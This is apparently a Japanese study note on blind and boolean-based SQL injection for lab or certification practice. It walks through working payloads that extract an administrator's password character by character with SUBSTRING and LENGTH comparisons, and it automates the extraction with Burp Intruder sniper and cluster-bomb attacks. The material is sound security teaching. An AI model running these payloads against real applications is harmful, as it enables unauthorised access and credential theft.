# Blind SQLiとは

- SQLiに対して脆弱だが、クエリの直接的な結果、DBエラーの詳細が見えない場合のSQLiのこと
- クエリの結果が見えないので、[3. DBの構成情報の探索](../3.%20DBの構成情報の探索.md#RDBの種類とバージョン特定)のような方法で一発で特定できない
- 条件によって異なるレスポンスを利用する
	- エラーメッセージ
	- レスポンス時間
	- レスポンスのlength等...

⭐️ 必ず**意図された値とエラーを引き起こす値を入力し**、アプリケーションの動作をテストすること

- 情報を抽出したい場合は、基本的に==1文字ずつ明らかにする==

# Boolean-based SQLiの基本

- SQLの条件文を追加し、条件の真偽によって引き起こされるレスポンスの違いから、内部の情報を入手する
- ==⚠️==：カラム名がわかっていないと使えない

## Boolean-based SQLiの具体例

- URLのクエリパラメタで、user=offsecが正規の値のとき、画面にPassword Hashなどが表示されている

![[Pasted image 20250417071003.png]]

- ここで、SQLの条件文で、Trueとなる条件を追加する
```
?user=offsec' AND 1=1 -- //
```
→Webアプリのレスポンスは変わっていない
![[Pasted image 20250417071232.png]]

- 次に、SQLの条件分で、Falseとなる条件を追加する
```
?user=offsec' AND 1=2 -- //
```
→Webアプリのレスポンスが変わっている（Password Hashなどが表示されない）
![[Pasted image 20250417071434.png]]

- 【結論】
	- user=offsecという正規の値を使用しているにもかかわらず、ユーザの任意のSQL条件分でWebアプリの挙動が変わる
	- つまり、抽出したい情報（パスワード等）をTrueかFalseで正しいかどうかを判断できる（※ただし１文字ずつ）

### ⭐️SUBSTR関数（文字の抽出・比較用）

- 参考: [SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「Substring」

以下の用途：
- 文字列から文字を抽出すること
- 抽出した文字が、指定した文字よりアルファベット順的に小さいか大きいかを判別すること（↓例）
	- `SUBSTR(('foobar'), 1, 1) < g` → true
	- `SUBSTR(('foobar'), 1, 1) > g` → false

- ↑文字列`('foobar'`)の部分にSQLクエリを代入する場合
```sql
SUBSTR((SElECT hoge FROM foo WHERE xxx=yyy), 1, 1) > g
```

# Boolean-Based SQLiの具体的な流れ

前提
- Usersというテーブルがあり、UsernameとPasswordの列を持つとする
- Administratorというユーザがいるとする
- パスワードを1文字ずつテストし、Administratorのパスワードを割り出す

1. 文字のおおまかな範囲を決定する。
	( ==⚠️==：文字の比較は[ASCIIコード](https://www.k-cube.co.jp/wakaba/server/ascii_code.html)による。数字<アルファベット小文字<大文字)
```sql
user=offsec' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm' -- //
```
- このクエリによりTRUEを意味するレスポンスが返ってきたら、Administrator のパスワードの==1文字めは指定した文字(m)より大きい==ことを示す

2. 引き続き範囲を特定する
```sql
user=offsec' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't' -- //
```
- Webアプリの挙動が異なる＝条件分がfalseなので、最初の1文字めはtより小さいことがわかる

3. 文字を特定する
```sql
user=offsec' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' -- //
```
- これで条件がTrueであることを意味するレスポンス("Welcome Back")が返ってきたら、パスワードの1文字めはsということがわかる。

4. これを2文字め以降も続ける
```sql
SUBSTRING((SELECT ~ ), 2, 1) >'a'
SUBSTRING((SELECT ~ ), 3, 1) >'0'
 ⋮
```
- ⚠️数字でも`'`シングルクオテーションは忘れずに。

# 楽な攻撃方法：Intruder

- 例えば`users`テーブルがあり、`username`, `password`のカラムがあるとする。
- ここで`username='administrator'`の`password`を抽出したいとする。

## ①. 抽出したいデータの長さを調べる

1. おおまかな文字列長の幅を決める
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 1) = 'administrator' -- //
```
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > 50) = 'administrator' -- //
```

2. Intruderで正確な文字数を総当たりして割り出す
```sql
user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password) > §1§) = 'administrator'-- //
```
- Attack Type: sniper
- Payload Type: Numbers
![[Pasted image 20231107235744.png | 300]]

3. Intruderの結果から、レスポンスが変わる境界値を探し、実際にWebアプリ上で条件がTrueの反応があるかどうかを確かめる

## ②. Cluster bombでパスワードを割り出す

1. SUBSTRING関数で1文字目を抽出し、指定した値と比較するクエリを作成する
```sql
user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1, 1) = '0' -- //
```

2. Intruderで総当たりしてパスワードを割り出す
```sql
user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),§1§, 1) = '§0§' -- //
```
- `§1§`: `SUBSTRING`関数で抽出するスタート地点のインデックス(1からスタート)
- `'§0§'`: 抽出した文字の比較先の文字
- Attack Type : Cluster bomb
- Payload set: 1 (`§1§`)
	- Payload type: Numbers
	- From: 1 
	- To: [4-1. Boolean-based SQLi](4-1.%20Boolean-based%20SQLi.md#①.%20抽出したいデータの長さを調べる)でわかった数
	- Step:1

- Payload set: 2(`'§0§'`)
	- Payload type: Brute forcer
	- Min length:1
	- Max length:1

## ③. レスポンスの差異を確認

IntruderのLength列を降順にソートし、Responseに条件が正の時のメッセージが記載されているペイロードを抽出していく
